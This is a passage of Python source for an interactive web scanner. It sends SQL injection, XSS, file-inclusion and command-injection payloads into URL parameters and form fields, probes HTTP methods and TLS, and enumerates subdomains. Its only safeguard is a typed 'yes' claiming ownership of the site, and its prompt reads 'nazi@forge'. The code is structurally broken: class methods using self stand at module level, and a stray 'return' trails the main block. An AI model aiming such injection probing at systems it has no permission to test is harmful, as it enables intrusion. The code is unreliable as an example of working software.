                    return
            if 'sleep' in pl.lower() and r['dt'] > 2.5:
                self.add(url, 'SQLI',
                         "Time delay: " + str(round(r['dt'], 2)) + "s",
                         "CRITICAL")
                return

# ─────────────── XSS ───────────────
def test_xss(self, url):
    print("\n\033[96m[+]\033[0m XSS Detection...")
    for p in self.params(url):
        for pl in XSS_PAYLOADS:
            r = self.cl.req(self.inject(url, p, pl))
            if r['err']:
                continue
            if pl in r['t']:
                self.add(url, 'XSS', "Reflected: " + pl[:50], "HIGH")
                return

# ─────────────── LFI ───────────────
def test_lfi(self, url):
    print("\n\033[96m[+]\033[0m LFI Detection...")
    for p in self.params(url):
        for pl in LFI_PAYLOADS:
            r = self.cl.req(self.inject(url, p, pl))
            if r['err']:
                continue
            for ind in LFI_IND:
                if ind in r['t']:
                    self.add(url, 'LFI', "Leak: " + ind, "CRITICAL")
                    return

# ─────────────── RCE ───────────────
def test_rce(self, url):
    print("\n\033[96m[+]\033[0m RCE Detection...")
    for p in self.params(url):
        for pl in RCE_PAYLOADS:
            r = self.cl.req(self.inject(url, p, pl))
            if r['err']:
                continue
            for ind in RCE_IND:
                if ind in r['t']:
                    self.add(url, 'RCE', "Output: " + ind, "CRITICAL")
                    return

# ─────────────── HTTP METHODS ───────────────
def test_http_methods(self, url):
    print("\n\033[96m[+]\033[0m HTTP Methods...")
    allowed = []
    for m in HTTP_METHODS:
        r = self.cl.req(url, method=m)
        if not r['err'] and r['s'] not in (405, 501):
            allowed.append(m)
            if m in ('PUT', 'DELETE', 'TRACE'):
                self.add(url, 'HTTP',
                         "Method " + m + " allowed (" + str(r['s']) + ")",
                         "HIGH")
    if allowed:
        self.info_add('HTTP-Methods', ', '.join(allowed))

# ─────────────── SSL/TLS ───────────────
def test_ssl(self, url):
    print("\n\033[96m[+]\033[0m SSL/TLS Audit...")
    pr = urllib.parse.urlparse(url)
    if pr.scheme != 'https':
        return
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with socket.create_connection((pr.hostname, pr.port or 443),
                                      timeout=5) as s:
            with ctx.wrap_socket(s, server_hostname=pr.hostname) as ss:
                version = ss.version()
                cipher = ss.cipher()
                self.info_add('TLS-Version', version)
                if cipher:
                    self.info_add('TLS-Cipher', cipher[0])
                cert = ss.getpeercert()
                if cert:
                    subject = dict(x[0] for x in cert.get('subject', []))
                    issuer = dict(x[0] for x in cert.get('issuer', []))
                    if subject.get('commonName'):
                        self.info_add('SSL-CN',
                                      subject.get('commonName'))
                    if issuer.get('organizationName'):
                        self.info_add('SSL-Issuer',
                                      issuer.get('organizationName'))
                if version in ('TLSv1', 'TLSv1.1', 'SSLv2', 'SSLv3'):
                    self.add(url, 'SSL', "Weak: " + version, "HIGH")
    except Exception as e:
        print("  \033[91m[!]\033[0m " + str(e))

# ─────────────── SUBDOMAIN ENUM ───────────────
def test_subdomains(self, domain):
    print("\n\033[96m[+]\033[0m Subdomain Enumeration...")
    found = 0
    with ThreadPoolExecutor(max_workers=20) as ex:
        futures = {}
        for s in SUBDOMAINS:
            url = "http://" + s + "." + domain
            futures[ex.submit(self.cl.req, url)] = (s, url)
        for fut in as_completed(futures):
            s, url = futures[fut]
            try:
                r = fut.result()
                if not r['err'] and r['s'] in (200, 301, 302, 401, 403):
                    self.add(url, 'SUB',
                             "Subdomain found (" + str(r['s']) + ")",
                             "MEDIUM")
                    found += 1
            except Exception:
                pass
    print("  \033[92m[+]\033[0m Found " + str(found) + " subdomain(s)")

# ─────────────── DEEP SCAN ───────────────
def deep_scan(self):
    """Run vulnerability tests on URL with params"""
    params = self.params(self.url)
    if not params:
        print("\n\033[93m[!]\033[0m No URL parameters to test")
        return
    try:
        self.test_sqli(self.url)
    except Exception as e:
        print("  \033[91m[!]\033[0m " + str(e))
    try:
        self.test_xss(self.url)
    except Exception as e:
        print("  \033[91m[!]\033[0m " + str(e))
    try:
        self.test_lfi(self.url)
    except Exception as e:
        print("  \033[91m[!]\033[0m " + str(e))
    try:
        self.test_rce(self.url)
    except Exception as e:
        print("  \033[91m[!]\033[0m " + str(e))

# ─────────────── FORMS DISCOVERY ───────────────
def get_forms(self, url):
    r = self.cl.req(url)
    if r['err'] or not r['t']:
        return []
    forms = []
    for fm in re.finditer(r'<form[^>]*>(.*?)</form>',
                          r['t'], re.DOTALL | re.IGNORECASE):
        html = fm.group(1)
        am = re.search(r'action=["\']([^"\']*)["\']', html, re.IGNORECASE)
        mm = re.search(r'method=["\']([^"\']*)["\']', html, re.IGNORECASE)
        action = am.group(1) if am else url
        method = (mm.group(1) if mm else 'get').lower()
        if not action or action == '#':
            action = url
        elif not action.startswith(('http://', 'https://')):
            action = urllib.parse.urljoin(url, action)
        inputs = re.findall(
            r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>',
            html, re.IGNORECASE)
        inputs += re.findall(
            r'<textarea[^>]*name=["\']([^"\']+)["\'][^>]*>',
            html, re.IGNORECASE)
        if inputs:
            forms.append({'action': action, 'method': method,
                          'inputs': list(set(inputs))})
    return forms

def test_forms(self):
    print("\n\033[96m[+]\033[0m Form Discovery...")
    forms = self.get_forms(self.url)
    if not forms:
        return
    print("  \033[92m[+]\033[0m Found " + str(len(forms)) + " form(s)")
    for fm in forms:
        print("\n  \033[93m[*]\033[0m Form: " + fm['action'][:70] +
              " [" + fm['method'].upper() + "]")
        for p in fm['inputs']:
            print("    \033[2m->\033[0m \033[93m" + p + "\033[0m")
            if fm['method'] == 'post':
                fd = {i: 'test' for i in fm['inputs']}
                d = urllib.parse.urlencode(fd).encode()
                try:
                    self.test_sqli_post(fm['action'], p, d)
                    self.test_xss_post(fm['action'], p, d)
                except Exception:
                    pass
            else:
                tu = fm['action'] + '?' + urllib.parse.urlencode(
                    {i: 'test' for i in fm['inputs']})
                old_url = self.url
                self.url = tu
                try:
                    self.test_sqli(tu)
                    self.test_xss(tu)
                except Exception:
                    pass
                self.url = old_url

def test_sqli_post(self, url, param, data):
    for pl in SQLI_PAYLOADS[:5]:
        fd = dict(urllib.parse.parse_qsl(data.decode()))
        fd[param] = pl
        nd = urllib.parse.urlencode(fd).encode()
        r = self.cl.req(url, data=nd, method='POST')
        if r['err']:
            continue
        for err in SQLI_ERRORS:
            if err in r['t'].lower():
                self.add(url, 'SQLI', "POST " + param + ": " + err,
                         "CRITICAL")
                return

def test_xss_post(self, url, param, data):
    for pl in XSS_PAYLOADS:
        fd = dict(urllib.parse.parse_qsl(data.decode()))
        fd[param] = pl
        nd = urllib.parse.urlencode(fd).encode()
        r = self.cl.req(url, data=nd, method='POST')
        if r['err']:
            continue
        if pl in r['t']:
            self.add(url, 'XSS', "POST " + param + ": " + pl[:50],
                     "HIGH")
# ═══════════════════════════════════════════════════════════════════════════
# AUTO-DETECT + MAIN
# ═══════════════════════════════════════════════════════════════════════════

def is_url(text):
    if re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(/.*)?$', text):
        return True
    if text.startswith(('http://', 'https://')):
        return True
    if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', text):
        return True
    if text.startswith('localhost'):
        return True
    return False


def normalize_url(text):
    if not text.startswith(('http://', 'https://')):
        text = 'http://' + text
    return text


def main():
    print(LOGO)
    print("\n\033[96m" + "=" * 60 + "\033[0m")
    print("\033[92m  Information Gatherer - Type your OWN site domain.\033[0m")
    print("\033[93m  Detection only. No exploitation.\033[0m")
    print("\033[96m" + "=" * 60 + "\033[0m")
    print("\n\033[93mAccepted formats:\033[0m")
    print("  \033[92mkurd4u.com\033[0m              - Domain")
    print("  \033[92mhttps://kurd4u.com\033[0m      - With protocol")
    print("  \033[92mhttp://kurd4u.com/path?id=1\033[0m - Full URL with params")
    print("  \033[92m192.168.1.1\033[0m             - IP address")
    print("  \033[92mlocalhost\033[0m               - Localhost")
    print("\n\033[93mOther commands:\033[0m")
    print("  \033[92mcookie <value>\033[0m   - Set cookie")
    print("  \033[92mproxy <URL>\033[0m      - Set proxy")
    print("  \033[92mthreads <N>\033[0m      - Set thread count")
    print("  \033[92msave <file>\033[0m      - Save last scan as JSON")
    print("  \033[92mstatus\033[0m           - Show current settings")
    print("  \033[92mclear\033[0m            - Clear screen")
    print("  \033[92mexit\033[0m             - Quit\n")

    st = {'cookie': None, 'proxy': None, 'threads': 30, 'last': None}

    while True:
        try:
            line = input("\033[1m\033[92mnazi\033[0m\033[93m@\033[0m"
                         "\033[96mforge\033[0m \033[94m>>\033[0m ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n\033[93m[!] Bye\033[0m")
            break

        if not line:
            continue

        parts = line.split(maxsplit=1)
        cmd = parts[0].lower()
        arg = parts[1].strip() if len(parts) > 1 else ""

        # ─── EXIT ───
        if cmd in ('exit', 'quit', 'q'):
            print("\033[93mBye.\033[0m")
            break

        # ─── HELP ───
        elif cmd == 'help':
            print("Type a domain (e.g. kurd4u.com) or: cookie, proxy, "
                  "threads, save, status, clear, exit")

        # ─── COOKIE ───
        elif cmd == 'cookie':
            if arg:
                st['cookie'] = arg
                print("\033[92m[+] Cookie set\033[0m")
            else:
                print("\033[91m[!] cookie <value>\033[0m")

        # ─── PROXY ───
        elif cmd == 'proxy':
            if arg:
                st['proxy'] = arg
                print("\033[92m[+] Proxy set\033[0m")
            else:
                print("\033[91m[!] proxy <URL>\033[0m")

        # ─── THREADS ───
        elif cmd == 'threads':
            if arg:
                try:
                    st['threads'] = int(arg)
                    print("\033[92m[+] Threads: " + arg + "\033[0m")
                except ValueError:
                    print("\033[91m[!] threads <number>\033[0m")
            else:
                print("\033[91m[!] threads <number>\033[0m")

        # ─── STATUS ───
        elif cmd == 'status':
            print("\n\033[96mSettings:\033[0m")
            print("  Cookie  : " + str(st['cookie'] or '(none)'))
            print("  Proxy   : " + str(st['proxy'] or '(none)'))
            print("  Threads : " + str(st['threads']) + "\n")

        # ─── CLEAR ───
        elif cmd == 'clear':
            os.system('clear')
            print(LOGO)

        # ─── SAVE ───
        elif cmd == 'save':
            if not st['last']:
                print("\033[91m[!] No scan yet\033[0m")
            elif not arg:
                print("\033[91m[!] save <filename>\033[0m")
            else:
                st['last'].save_json(arg)

        # ─── SCAN ───
        elif is_url(cmd):
            url = normalize_url(cmd)
            print("\n\033[93m[!]\033[0m Only use on YOUR OWN site!")
            print("\033[93m[?]\033[0m Scanning: \033[1m" + url + "\033[0m")
            conf = input("\033[93m    Confirm you own this site? "
                         "(yes/no): \033[0m").strip().lower()
            if conf not in ('yes', 'y', 'بەڵێ', 'b'):
                print("\033[93m[!] Aborted.\033[0m")
                continue
            cl = Client(timeout=10, cookie=st['cookie'], proxy=st['proxy'])
            sc = Scan(url, cl, threads=st['threads'])
            try:
                sc.run_all()
                st['last'] = sc
            except KeyboardInterrupt:
                print("\n\033[93m[!] Stopped\033[0m")
                st['last'] = sc
            except Exception as e:
                print("\n\033[91m[!] Error: " + str(e) + "\033[0m")

        # ─── UNKNOWN ───
        else:
            print("\033[91m[!] Unknown: " + cmd + "\033[0m")
            print("\033[93m    Type a domain (e.g. kurd4u.com) or 'help'\033[0m")


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\033[93m[!] Bye\033[0m")
            return
